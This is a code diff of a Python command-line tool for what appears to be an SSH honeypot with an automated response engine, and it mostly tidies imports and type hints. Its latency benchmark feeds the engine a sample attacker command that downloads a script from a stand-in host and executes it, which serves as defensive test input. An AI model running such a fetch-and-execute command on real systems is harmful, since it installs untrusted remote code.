@@ -18,18 +18,17 @@ from __future__ import annotations
 import asyncio
 import json
 import os
-import sys
 from pathlib import Path
-from typing import Annotated, Optional
+from typing import Annotated
 
 try:
     import typer
+    from rich import print as rprint
     from rich.console import Console
-    from rich.table import Table
     from rich.panel import Panel
     from rich.progress import Progress, SpinnerColumn, TextColumn
     from rich.syntax import Syntax
-    from rich import print as rprint
+    from rich.table import Table
     _HAS_CLI = True
 except ImportError:
     _HAS_CLI = False
@@ -67,10 +66,10 @@ if _HAS_CLI:
             str, typer.Option("--env", "-e", help="Path to .env file")
         ] = ".env",
         host: Annotated[
-            Optional[str], typer.Option("--host", "-h", help="Listen host")
+            str | None, typer.Option("--host", "-h", help="Listen host")
         ] = None,
         port: Annotated[
-            Optional[int], typer.Option("--port", "-p", help="SSH listen port")
+            int | None, typer.Option("--port", "-p", help="SSH listen port")
         ] = None,
         debug: Annotated[
             bool, typer.Option("--debug", "-d", help="Enable debug logging")
@@ -80,8 +79,9 @@ if _HAS_CLI:
         _header()
 
         async def _run():
-            from .server import main as server_main
             import sys as _sys
+
+            from .server import main as server_main
             _sys.argv = [
                 "server",
                 "--config", str(config),
@@ -114,8 +114,9 @@ if _HAS_CLI:
         console.print(f"[bold]MTTB Benchmark[/] — {iterations} iterations, target < 100ms\n")
 
         async def _bench():
-            from .soar import SOAREngine
             import time
+
+            from .soar import SOAREngine
 
             soar = SOAREngine(
                 risk_threshold=30,
@@ -135,7 +136,7 @@ if _HAS_CLI:
                     t0 = time.perf_counter()
                     await soar.process_event(f"bench_{i}", {
                         "eventid": "cloudsentinel.command.input",
-                        "input": f"wget http://evil.example/bot.sh && bash -c ./bot.sh",
+                        "input": "wget http://evil.example/bot.sh && bash -c ./bot.sh",
                         "src_ip": "8.8.8.8",
                         "country_code": "RU",
                     })
